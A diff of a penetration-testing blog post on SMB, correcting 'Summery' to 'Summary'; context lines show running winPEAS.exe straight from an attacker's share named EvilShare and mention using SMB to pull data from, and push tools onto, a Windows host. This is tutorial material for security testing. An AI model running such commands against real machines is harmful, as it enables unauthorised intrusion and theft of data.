@@ -122,7 +122,7 @@ We can also directly execute the binary straight from the share.
 C:\>  \\10.10.11.2\EvilShare\winPEAS.exe
 ```
 
-## In Summery
+## In Summary
 SMB might not always be exploitable but it can still be a power tool for not only extracting data from a host but we can also use it for transfering our own data from our local machine to a windows host.
 
 I think you should always get excited if you see smb is open on a machine and it is always a good place to start enumerating futher. I hope this post helps facilitate that.
